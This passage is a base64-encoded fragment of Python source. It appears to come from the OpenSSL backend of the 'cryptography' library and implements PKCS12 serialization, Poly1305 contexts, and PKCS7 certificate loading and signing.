lmIG1heWJlX25hbWUgIT0gc2VsZi5fZmZpLk5VTEw6XHJcbiAgICAgICAgICAgICAgICAgICAgYWRkbF9uYW1lID0gc2VsZi5fZmZpLnN0cmluZyhtYXliZV9uYW1lKVxyXG4gICAgICAgICAgICAgICAgYWRkaXRpb25hbF9jZXJ0aWZpY2F0ZXMuYXBwZW5kKFxyXG4gICAgICAgICAgICAgICAgICAgIFBLQ1MxMkNlcnRpZmljYXRlKGFkZGxfY2VydCwgYWRkbF9uYW1lKVxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gUEtDUzEyS2V5QW5kQ2VydGlmaWNhdGVzKGtleSwgY2VydCwgYWRkaXRpb25hbF9jZXJ0aWZpY2F0ZXMpXHJcblxyXG4gICAgZGVmIHNlcmlhbGl6ZV9rZXlfYW5kX2NlcnRpZmljYXRlc190b19wa2NzMTIoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBuYW1lOiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdLFxyXG4gICAgICAgIGtleTogdHlwaW5nLk9wdGlvbmFsW19BTExPV0VEX1BLQ1MxMl9UWVBFU10sXHJcbiAgICAgICAgY2VydDogdHlwaW5nLk9wdGlvbmFsW3g1MDkuQ2VydGlmaWNhdGVdLFxyXG4gICAgICAgIGNhczogdHlwaW5nLk9wdGlvbmFsW3R5cGluZy5MaXN0W19QS0NTMTJfQ0FTX1RZUEVTXV0sXHJcbiAgICAgICAgZW5jcnlwdGlvbl9hbGdvcml0aG06IHNlcmlhbGl6YXRpb24uS2V5U2VyaWFsaXphdGlvbkVuY3J5cHRpb24sXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIHBhc3N3b3JkID0gTm9uZVxyXG4gICAgICAgIGlmIG5hbWUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHV0aWxzLl9jaGVja19ieXRlcygibmFtZSIsIG5hbWUpXHJcblxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2UoZW5jcnlwdGlvbl9hbGdvcml0aG0sIHNlcmlhbGl6YXRpb24uTm9FbmNyeXB0aW9uKTpcclxuICAgICAgICAgICAgbmlkX2NlcnQgPSAtMVxyXG4gICAgICAgICAgICBuaWRfa2V5ID0gLTFcclxuICAgICAgICAgICAgcGtjczEyX2l0ZXIgPSAwXHJcbiAgICAgICAgICAgIG1hY19pdGVyID0gMFxyXG4gICAgICAgIGVsaWYgaXNpbnN0YW5jZShcclxuICAgICAgICAgICAgZW5jcnlwdGlvbl9hbGdvcml0aG0sIHNlcmlhbGl6YXRpb24uQmVzdEF2YWlsYWJsZUVuY3J5cHRpb25cclxuICAgICAgICApOlxyXG4gICAgICAgICAgICAjIFBLQ1MxMiBlbmNyeXB0aW9uIGlzIGhvcGVsZXNzIHRyYXNoIGFuZCBjYW4gbmV2ZXIgYmUgZml4ZWQuXHJcbiAgICAgICAgICAgICMgVGhpcyBpcyB0aGUgbGVhc3QgdGVycmlibGUgb3B0aW9uLlxyXG4gICAgICAgICAgICBuaWRfY2VydCA9IHNlbGYuX2xpYi5OSURfcGJlX1dpdGhTSEExQW5kM19LZXlfVHJpcGxlREVTX0NCQ1xyXG4gICAgICAgICAgICBuaWRfa2V5ID0gc2VsZi5fbGliLk5JRF9wYmVfV2l0aFNIQTFBbmQzX0tleV9UcmlwbGVERVNfQ0JDXHJcbiAgICAgICAgICAgICMgQXQgbGVhc3Qgd2UgY2FuIHNldCB0aGlzIGhpZ2hlciB0aGFuIE9wZW5TU0xcJ3MgZGVmYXVsdFxyXG4gICAgICAgICAgICBwa2NzMTJfaXRlciA9IDIwMDAwXHJcbiAgICAgICAgICAgICMgbWFjX2l0ZXIgY2hvc2VuIGZvciBjb21wYXRpYmlsaXR5IHJlYXNvbnMsIHNlZTpcclxuICAgICAgICAgICAgIyBodHRwczovL3d3dy5vcGVuc3NsLm9yZy9kb2NzL21hbjEuMS4xL21hbjMvUEtDUzEyX2NyZWF0ZS5odG1sXHJcbiAgICAgICAgICAgICMgRGlkIHdlIG1lbnRpb24gaG93IGxvdXN5IFBLQ1MxMiBlbmNyeXB0aW9uIGlzP1xyXG4gICAgICAgICAgICBtYWNfaXRlciA9IDFcclxuICAgICAgICAgICAgcGFzc3dvcmQgPSBlbmNyeXB0aW9uX2FsZ29yaXRobS5wYXNzd29yZFxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlVuc3VwcG9ydGVkIGtleSBlbmNyeXB0aW9uIHR5cGUiKVxyXG5cclxuICAgICAgICBpZiBjYXMgaXMgTm9uZSBvciBsZW4oY2FzKSA9PSAwOlxyXG4gICAgICAgICAgICBza194NTA5ID0gc2VsZi5fZmZpLk5VTExcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBza194NTA5ID0gc2VsZi5fbGliLnNrX1g1MDlfbmV3X251bGwoKVxyXG4gICAgICAgICAgICBza194NTA5ID0gc2VsZi5fZmZpLmdjKHNrX3g1MDksIHNlbGYuX2xpYi5za19YNTA5X2ZyZWUpXHJcblxyXG4gICAgICAgICAgICAjIFRoaXMgbGlzdCBpcyB0byBrZWVwIHRoZSB4NTA5IHZhbHVlcyBhbGl2ZSB1bnRpbCBlbmQgb2YgZnVuY3Rpb25cclxuICAgICAgICAgICAgb3NzbF9jYXMgPSBbXVxyXG4gICAgICAgICAgICBmb3IgY2EgaW4gY2FzOlxyXG4gICAgICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShjYSwgUEtDUzEyQ2VydGlmaWNhdGUpOlxyXG4gICAgICAgICAgICAgICAgICAgIGNhX2FsaWFzID0gY2EuZnJpZW5kbHlfbmFtZVxyXG4gICAgICAgICAgICAgICAgICAgIG9zc2xfY2EgPSBzZWxmLl9jZXJ0Mm9zc2woY2EuY2VydGlmaWNhdGUpXHJcbiAgICAgICAgICAgICAgICAgICAgd2l0aCBzZWxmLl96ZXJvZWRfbnVsbF90ZXJtaW5hdGVkX2J1ZihcclxuICAgICAgICAgICAgICAgICAgICAgICAgY2FfYWxpYXNcclxuICAgICAgICAgICAgICAgICAgICApIGFzIGNhX25hbWVfYnVmOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICByZXMgPSBzZWxmLl9saWIuWDUwOV9hbGlhc19zZXQxKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgb3NzbF9jYSwgY2FfbmFtZV9idWYsIC0xXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgb3NzbF9jYSA9IHNlbGYuX2NlcnQyb3NzbChjYSlcclxuICAgICAgICAgICAgICAgIG9zc2xfY2FzLmFwcGVuZChvc3NsX2NhKVxyXG4gICAgICAgICAgICAgICAgcmVzID0gc2VsZi5fbGliLnNrX1g1MDlfcHVzaChza194NTA5LCBvc3NsX2NhKVxyXG4gICAgICAgICAgICAgICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPj0gMSlcclxuXHJcbiAgICAgICAgd2l0aCBzZWxmLl96ZXJvZWRfbnVsbF90ZXJtaW5hdGVkX2J1ZihwYXNzd29yZCkgYXMgcGFzc3dvcmRfYnVmOlxyXG4gICAgICAgICAgICB3aXRoIHNlbGYuX3plcm9lZF9udWxsX3Rlcm1pbmF0ZWRfYnVmKG5hbWUpIGFzIG5hbWVfYnVmOlxyXG4gICAgICAgICAgICAgICAgb3NzbF9jZXJ0ID0gc2VsZi5fY2VydDJvc3NsKGNlcnQpIGlmIGNlcnQgZWxzZSBzZWxmLl9mZmkuTlVMTFxyXG4gICAgICAgICAgICAgICAgaWYga2V5IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgIGV2cF9wa2V5ID0ga2V5Ll9ldnBfcGtleSAgIyB0eXBlOiBpZ25vcmVbdW5pb24tYXR0cl1cclxuICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9mZmkuTlVMTFxyXG5cclxuICAgICAgICAgICAgICAgIHAxMiA9IHNlbGYuX2xpYi5QS0NTMTJfY3JlYXRlKFxyXG4gICAgICAgICAgICAgICAgICAgIHBhc3N3b3JkX2J1ZixcclxuICAgICAgICAgICAgICAgICAgICBuYW1lX2J1ZixcclxuICAgICAgICAgICAgICAgICAgICBldnBfcGtleSxcclxuICAgICAgICAgICAgICAgICAgICBvc3NsX2NlcnQsXHJcbiAgICAgICAgICAgICAgICAgICAgc2tfeDUwOSxcclxuICAgICAgICAgICAgICAgICAgICBuaWRfa2V5LFxyXG4gICAgICAgICAgICAgICAgICAgIG5pZF9jZXJ0LFxyXG4gICAgICAgICAgICAgICAgICAgIHBrY3MxMl9pdGVyLFxyXG4gICAgICAgICAgICAgICAgICAgIG1hY19pdGVyLFxyXG4gICAgICAgICAgICAgICAgICAgIDAsXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocDEyICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHAxMiA9IHNlbGYuX2ZmaS5nYyhwMTIsIHNlbGYuX2xpYi5QS0NTMTJfZnJlZSlcclxuXHJcbiAgICAgICAgYmlvID0gc2VsZi5fY3JlYXRlX21lbV9iaW9fZ2MoKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5pMmRfUEtDUzEyX2JpbyhiaW8sIHAxMilcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA+IDApXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JlYWRfbWVtX2JpbyhiaW8pXHJcblxyXG4gICAgZGVmIHBvbHkxMzA1X3N1cHBvcnRlZChzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIGlmIHNlbGYuX2ZpcHNfZW5hYmxlZDpcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2xpYi5DcnlwdG9ncmFwaHlfSEFTX1BPTFkxMzA1ID09IDFcclxuXHJcbiAgICBkZWYgY3JlYXRlX3BvbHkxMzA1X2N0eChzZWxmLCBrZXk6IGJ5dGVzKSAtPiBfUG9seTEzMDVDb250ZXh0OlxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlc2xpa2UoImtleSIsIGtleSlcclxuICAgICAgICBpZiBsZW4oa2V5KSAhPSBfUE9MWTEzMDVfS0VZX1NJWkU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkEgcG9seTEzMDUga2V5IGlzIDMyIGJ5dGVzIGxvbmciKVxyXG5cclxuICAgICAgICByZXR1cm4gX1BvbHkxMzA1Q29udGV4dChzZWxmLCBrZXkpXHJcblxyXG4gICAgZGVmIHBrY3M3X3N1cHBvcnRlZChzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBub3Qgc2VsZi5fbGliLkNSWVBUT0dSQVBIWV9JU19CT1JJTkdTU0xcclxuXHJcbiAgICBkZWYgbG9hZF9wZW1fcGtjczdfY2VydGlmaWNhdGVzKFxyXG4gICAgICAgIHNlbGYsIGRhdGE6IGJ5dGVzXHJcbiAgICApIC0+IHR5cGluZy5MaXN0W3g1MDkuQ2VydGlmaWNhdGVdOlxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlcygiZGF0YSIsIGRhdGEpXHJcbiAgICAgICAgYmlvID0gc2VsZi5fYnl0ZXNfdG9fYmlvKGRhdGEpXHJcbiAgICAgICAgcDcgPSBzZWxmLl9saWIuUEVNX3JlYWRfYmlvX1BLQ1M3KFxyXG4gICAgICAgICAgICBiaW8uYmlvLCBzZWxmLl9mZmkuTlVMTCwgc2VsZi5fZmZpLk5VTEwsIHNlbGYuX2ZmaS5OVUxMXHJcbiAgICAgICAgKVxyXG4gICAgICAgIGlmIHA3ID09IHNlbGYuX2ZmaS5OVUxMOlxyXG4gICAgICAgICAgICBzZWxmLl9jb25zdW1lX2Vycm9ycygpXHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlVuYWJsZSB0byBwYXJzZSBQS0NTNyBkYXRhIilcclxuXHJcbiAgICAgICAgcDcgPSBzZWxmLl9mZmkuZ2MocDcsIHNlbGYuX2xpYi5QS0NTN19mcmVlKVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9sb2FkX3BrY3M3X2NlcnRpZmljYXRlcyhwNylcclxuXHJcbiAgICBkZWYgbG9hZF9kZXJfcGtjczdfY2VydGlmaWNhdGVzKFxyXG4gICAgICAgIHNlbGYsIGRhdGE6IGJ5dGVzXHJcbiAgICApIC0+IHR5cGluZy5MaXN0W3g1MDkuQ2VydGlmaWNhdGVdOlxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlcygiZGF0YSIsIGRhdGEpXHJcbiAgICAgICAgYmlvID0gc2VsZi5fYnl0ZXNfdG9fYmlvKGRhdGEpXHJcbiAgICAgICAgcDcgPSBzZWxmLl9saWIuZDJpX1BLQ1M3X2JpbyhiaW8uYmlvLCBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBpZiBwNyA9PSBzZWxmLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgc2VsZi5fY29uc3VtZV9lcnJvcnMoKVxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJVbmFibGUgdG8gcGFyc2UgUEtDUzcgZGF0YSIpXHJcblxyXG4gICAgICAgIHA3ID0gc2VsZi5fZmZpLmdjKHA3LCBzZWxmLl9saWIuUEtDUzdfZnJlZSlcclxuICAgICAgICByZXR1cm4gc2VsZi5fbG9hZF9wa2NzN19jZXJ0aWZpY2F0ZXMocDcpXHJcblxyXG4gICAgZGVmIF9sb2FkX3BrY3M3X2NlcnRpZmljYXRlcyhzZWxmLCBwNyk6XHJcbiAgICAgICAgbmlkID0gc2VsZi5fbGliLk9CSl9vYmoybmlkKHA3LnR5cGUpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChuaWQgIT0gc2VsZi5fbGliLk5JRF91bmRlZilcclxuICAgICAgICBpZiBuaWQgIT0gc2VsZi5fbGliLk5JRF9wa2NzN19zaWduZWQ6XHJcbiAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAgICAgIk9ubHkgYmFzaWMgc2lnbmVkIHN0cnVjdHVyZXMgYXJlIGN1cnJlbnRseSBzdXBwb3J0ZWQuIE5JRCJcclxuICAgICAgICAgICAgICAgICIgZm9yIHRoaXMgZGF0YSB3YXMge30iLmZvcm1hdChuaWQpLFxyXG4gICAgICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfU0VSSUFMSVpBVElPTixcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBza194NTA5ID0gcDcuZC5zaWduLmNlcnRcclxuICAgICAgICBudW0gPSBzZWxmLl9saWIuc2tfWDUwOV9udW0oc2tfeDUwOSlcclxuICAgICAgICBjZXJ0cyA9IFtdXHJcbiAgICAgICAgZm9yIGkgaW4gcmFuZ2UobnVtKTpcclxuICAgICAgICAgICAgeDUwOSA9IHNlbGYuX2xpYi5za19YNTA5X3ZhbHVlKHNrX3g1MDksIGkpXHJcbiAgICAgICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoeDUwOSAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICAgICAgcmVzID0gc2VsZi5fbGliLlg1MDlfdXBfcmVmKHg1MDkpXHJcbiAgICAgICAgICAgICMgV2hlbiBPcGVuU1NMIGlzIGxlc3MgdGhhbiAxLjEuMCB1cF9yZWYgcmV0dXJucyB0aGUgY3VycmVudFxyXG4gICAgICAgICAgICAjIHJlZmNvdW50LiBPbiAxLjEuMCsgaXQgcmV0dXJucyAxIGZvciBzdWNjZXNzLlxyXG4gICAgICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA+PSAxKVxyXG4gICAgICAgICAgICB4NTA5ID0gc2VsZi5fZmZpLmdjKHg1MDksIHNlbGYuX2xpYi5YNTA5X2ZyZWUpXHJcbiAgICAgICAgICAgIGNlcnQgPSBzZWxmLl9vc3NsMmNlcnQoeDUwOSlcclxuICAgICAgICAgICAgY2VydHMuYXBwZW5kKGNlcnQpXHJcblxyXG4gICAgICAgIHJldHVybiBjZXJ0c1xyXG5cclxuICAgIGRlZiBwa2NzN19zZXJpYWxpemVfY2VydGlmaWNhdGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgY2VydHM6IHR5cGluZy5MaXN0W3g1MDkuQ2VydGlmaWNhdGVdLFxyXG4gICAgICAgIGVuY29kaW5nOiBzZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgKTpcclxuICAgICAgICBjZXJ0cyA9IGxpc3QoY2VydHMpXHJcbiAgICAgICAgaWYgbm90IGNlcnRzIG9yIG5vdCBhbGwoXHJcbiAgICAgICAgICAgIGlzaW5zdGFuY2UoY2VydCwgeDUwOS5DZXJ0aWZpY2F0ZSkgZm9yIGNlcnQgaW4gY2VydHNcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImNlcnRzIG11c3QgYmUgYSBsaXN0IG9mIGNlcnRzIHdpdGggbGVuZ3RoID49IDEiKVxyXG5cclxuICAgICAgICBpZiBlbmNvZGluZyBub3QgaW4gKFxyXG4gICAgICAgICAgICBzZXJpYWxpemF0aW9uLkVuY29kaW5nLlBFTSxcclxuICAgICAgICAgICAgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5ERVIsXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJlbmNvZGluZyBtdXN0IERFUiBvciBQRU0gZnJvbSB0aGUgRW5jb2RpbmcgZW51bSIpXHJcblxyXG4gICAgICAgIGNlcnRzX3NrID0gc2VsZi5fbGliLnNrX1g1MDlfbmV3X251bGwoKVxyXG4gICAgICAgIGNlcnRzX3NrID0gc2VsZi5fZmZpLmdjKGNlcnRzX3NrLCBzZWxmLl9saWIuc2tfWDUwOV9mcmVlKVxyXG4gICAgICAgICMgVGhpcyBsaXN0IGlzIHRvIGtlZXAgdGhlIHg1MDkgdmFsdWVzIGFsaXZlIHVudGlsIGVuZCBvZiBmdW5jdGlvblxyXG4gICAgICAgIG9zc2xfY2VydHMgPSBbXVxyXG4gICAgICAgIGZvciBjZXJ0IGluIGNlcnRzOlxyXG4gICAgICAgICAgICBvc3NsX2NlcnQgPSBzZWxmLl9jZXJ0Mm9zc2woY2VydClcclxuICAgICAgICAgICAgb3NzbF9jZXJ0cy5hcHBlbmQob3NzbF9jZXJ0KVxyXG4gICAgICAgICAgICByZXMgPSBzZWxmLl9saWIuc2tfWDUwOV9wdXNoKGNlcnRzX3NrLCBvc3NsX2NlcnQpXHJcbiAgICAgICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID49IDEpXHJcbiAgICAgICAgIyBXZSB1c2UgUEtDUzdfc2lnbiBoZXJlIGJlY2F1c2UgaXQgY3JlYXRlcyB0aGUgUEtDUzcgYW5kIFBLQ1M3X1NJR05FRFxyXG4gICAgICAgICMgc3RydWN0dXJlcyBmb3IgdXMgcmF0aGVyIHRoYW4gcmVxdWlyaW5nIG1hbnVhbCBhc3NpZ25tZW50LlxyXG4gICAgICAgIHA3ID0gc2VsZi5fbGliLlBLQ1M3X3NpZ24oXHJcbiAgICAgICAgICAgIHNlbGYuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICBzZWxmLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgY2VydHNfc2ssXHJcbiAgICAgICAgICAgIHNlbGYuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICBzZWxmLl9saWIuUEtDUzdfUEFSVElBTCxcclxuICAgICAgICApXHJcbiAgICAgICAgYmlvX291dCA9IHNlbGYuX2NyZWF0ZV9tZW1fYmlvX2djKClcclxuICAgICAgICBpZiBlbmNvZGluZyBpcyBzZXJpYWxpemF0aW9uLkVuY29kaW5nLlBFTTpcclxuICAgICAgICAgICAgcmVzID0gc2VsZi5fbGliLlBFTV93cml0ZV9iaW9fUEtDUzdfc3RyZWFtKFxyXG4gICAgICAgICAgICAgICAgYmlvX291dCwgcDcsIHNlbGYuX2ZmaS5OVUxMLCAwXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBhc3NlcnQgZW5jb2RpbmcgaXMgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5ERVJcclxuICAgICAgICAgICAgcmVzID0gc2VsZi5fbGliLmkyZF9QS0NTN19iaW8oYmlvX291dCwgcDcpXHJcblxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JlYWRfbWVtX2JpbyhiaW9fb3V0KVxyXG5cclxuICAgIGRlZiBwa2NzN19zaWduKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgYnVpbGRlcjogcGtjczcuUEtDUzdTaWduYXR1cmVCdWlsZGVyLFxyXG4gICAgICAgIGVuY29kaW5nOiBzZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIG9wdGlvbnM6IHR5cGluZy5MaXN0W3BrY3M3LlBLQ1M3T3B0aW9uc10sXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIGFzc2VydCBidWlsZGVyLl9kYXRhIGlzIG5vdCBOb25lXHJcbiAgICAgICAgYmlvID0gc2VsZi5fYnl0ZXNfdG9fYmlvKGJ1aWxkZXIuX2RhdGEpXHJcbiAgICAgICAgaW5pdF9mbGFncyA9IHNlbGYuX2xpYi5QS0NTN19QQVJUSUFMXHJcbiAgICAgICAgZmluYWxfZmxhZ3MgPSAwXHJcblxyXG4gICAgICAgIGlmIGxlbihidWlsZGVyLl9hZGRpdGlvbmFsX2NlcnRzKSA9PSAwOlxyXG4gICAgICAgICAgICBjZXJ0cyA9IHNlbGYuX2ZmaS5OVUxMXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgY2VydHMgPSBzZWxmLl9saWIuc2tfWDUwOV9uZXdfbnVsbCgpXHJcbiAgICAgICAgICAgIGNlcnRzID0gc2VsZi5fZmZpLmdjKGNlcnRzLCBzZWxmLl9saWIuc2tfWDUwOV9mcmVlKVxyXG4gICAgICAgICAgICAjIFRoaXMgbGlzdCBpcyB0byBrZWVwIHRoZSB4NTA5IHZhbHVlcyBhbGl2ZSB1bnRpbCBlbmQgb2YgZnVuY3Rpb25cclxuICAgICAgICAgICAgb3NzbF9jZXJ0cyA9IFtdXHJcbiAgICAgICAgICAgIGZvciBjZXJ0IGluIGJ1aWxkZXIuX2FkZGl0aW9uYWxfY2VydHM6XHJcbiAgICAgICAgICAgICAgICBvc3NsX2NlcnQgPSBzZWxmLl9jZXJ0Mm9zc2woY2VydClcclxuICAgICAgICAgICAgICAgIG9zc2xfY2VydHMuYXBwZW5kKG9zc2xfY2VydClcclxuICAgICAgICAgICAgICAgIHJlcyA9IHNlbGYuX2xpYi5za19YNTA5X3B1c2goY2VydHMsIG9zc2xfY2VydClcclxuICAgICAgICAgICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID49IDEpXHJcblxyXG4gICAgICAgIGlmIHBrY3M3LlBLQ1M3T3B0aW9ucy5EZXRhY2hlZFNpZ25hdHVyZSBpbiBvcHRpb25zOlxyXG4gICAgICAgICAgICAjIERvblwndCBlbWJlZCB0aGUgZGF0YSBpbiB0aGUgUEtDUzcgc3RydWN0dXJlXHJcbiAgICAgICAgICAgIGluaXRfZmxhZ3MgfD0gc2VsZi5fbGliLlBLQ1M3X0RFVEFDSEVEXHJcbiAgICAgICAgICAgIGZpbmFsX2ZsYWdzIHw9IHNlbGYuX2xpYi5QS0NTN19ERVRBQ0hFRFxyXG5cclxuICAgICAgICAjIFRoaXMganVzdCBpbml0cyBhIHN0cnVjdHVyZSBmb3IgdXMuIEhvd2V2ZXIsIHRoZXJlXHJcbiAgICAgICAgIyBhcmUgZmxhZ3Mgd2UgbmVlZCB0byBzZXQsIGpveS5cclxuICAgICAgICBwNyA9IHNlbGYuX2xpYi5QS0NTN19zaWduKFxyXG4gICAgICAgICAgICBzZWxmLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgc2VsZi5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIGNlcnRzLFxyXG4gICAgICAgICAgICBzZWxmLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgaW5pdF9mbGFncyxcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChwNyAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBwNyA9IHNlbGYuX2ZmaS5nYyhwNywgc2VsZi5fbGliLlBLQ1M3X2ZyZWUpXHJcbiAgICAgICAgc2lnbmVyX2ZsYWdzID0gMFxyXG4gICAgICAgICMgVGhlc2UgZmxhZ3MgYXJlIGNvbmZpZ3VyYWJsZSBvbiBhIHBlci1zaWduYXR1cmUgYmFzaXNcclxuICAgICAgICAjIGJ1dCB3ZVwndmUgZGVsaWJlcmF0ZWx5IGNob3NlbiB0byBtYWtlIHRoZSBBUEkgb25seSBhbGxvd1xyXG4gICAgICAgICMgc2V0dGluZyBpdCBhY3Jvc3MgYWxsIHNpZ25hdHVyZXMgZm9yIG5vdy5cclxuICAgICAgICBpZiBwa2NzNy5QS0NTN09wdGlvbnMuTm9DYXBhYmlsaXRpZXMgaW4gb3B0aW9uczpcclxuICAgICAgICAgICAgc2lnbmVyX2ZsYWdzIHw9IHNlbGYuX2xpYi5QS0NTN19OT1NNSU1FQ0FQXHJcbiAgICAgICAgZWxpZiBwa2NzNy5QS0NTN09wdGlvbnMuTm9BdHRyaWJ1dGVzIGluIG9wdGlvbnM6XHJcbiAgICAgICAgICAgIHNpZ25lcl9mbGFncyB8PSBzZWxmLl9saWIuUEtDUzdfTk9BVFRSXHJcblxyXG4gICAgICAgIGlmIHBrY3M3LlBLQ1M3T3B0aW9ucy5Ob0NlcnRzIGluIG9wdGlvbnM6XHJcbiAgICAgICAgICAgIHNpZ25lcl9mbGFncyB8PSBzZWxmLl9saWIuUEtDUzdfTk9DRVJUU1xyXG5cclxuICAgICAgICBmb3IgY2VydGlmaWNhdGUsIHByaXZhdGVfa2V5LCBoYXNoX2FsZ29yaXRobSBpbiBidWlsZGVyLl9zaWduZXJzOlxyXG4gICAgICAgICAgICBvc3NsX2NlcnQgPSBzZWxmLl9jZXJ0Mm9zc2woY2VydGlmaWNhdGUpXHJcbiAgICAgICAgICAgIG1kID0gc2VsZi5fZXZwX21kX25vbl9udWxsX2Zyb21fYWxnb3JpdGhtKGhhc2hfYWxnb3JpdGhtKVxyXG4gICAgICAgICAgICBwN3NpZ25lcmluZm8gPSBzZWxmLl9saWIuUEtDUzdfc2lnbl9hZGRfc2lnbmVyKFxyXG4gICAgICAgICAgICAgICAgcDcsXHJcbiAgICAgICAgICAgICAgICBvc3NsX2NlcnQsXHJcbiAgICAgICAgICAgICAgICBwcml2YXRlX2tleS5fZXZwX3BrZXksICAjIHR5cGU6IGlnbm9yZVt1bmlvbi1hdHRyXVxyXG4gICAgICAgICAgICAgICAgbWQsXHJcbiAgICAgICAgICAgICAgICBzaWduZXJfZmxhZ3MsXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChwN3NpZ25lcmluZm8gIT0gc2VsZi5fZmZpLk5VTEwpXHJcblxyXG4gICAgICAgIGZvciBvcHRpb24gaW4gb3B0aW9uczpcclxuICAgICAgICAgICAgIyBEZXRhY2hlZFNpZ25hdHVyZSwgTm9DYXBhYmlsaXRpZXMsIGFuZCBOb0F0dHJpYnV0ZXMgYXJlIGFscmVhZHlcclxuICAgICAgICAgICAgIyBoYW5kbGVkIHNvIHdlIGp1c3QgbmVlZCB0byBjaGVjayB0aGVzZSBsYXN0IHR3byBvcHRpb25zLlxyXG4gICAgICAgICAgICBpZiBvcHRpb24gaXMgcGtjczcuUEtDUzdPcHRpb25zLlRleHQ6XHJcbiAgICAgICAgICAgICAgICBmaW5hbF9mbGFncyB8PSBzZWxmLl9saWIuUEtDUzdfVEVYVFxyXG4gICAgICAgICAgICBlbGlmIG9wdGlvbiBpcyBwa2NzNy5QS0NTN09wdGlvbnMuQmluYXJ5OlxyXG4gICAgICAgICAgICAgICAgZmluYWxfZmxhZ3MgfD0gc2VsZi5fbGliLlBLQ1M3X0JJTkFSWVxyXG5cclxuICAgICAgICBiaW9fb3V0ID0gc2VsZi5fY3JlYXRlX21lbV9iaW9fZ2MoKVxyXG4gICAgICAgIGlmIGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuU01JTUU6XHJcbiAgICAgICAgICAgICMgVGhpcyBmaW5hbGl6ZXMgdGhlIHN0cnVjdHVyZVxyXG4gICAgICAgICAgICByZXMgPSBzZWxmLl9saWIuU01JTUVfd3JpdGVfUEtDUzcoXHJcbiAgICAgICAgICAgICAgICBiaW9fb3V0LCBwNywgYmlvLmJpbywgZmluYWxfZmxhZ3NcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGVsaWYgZW5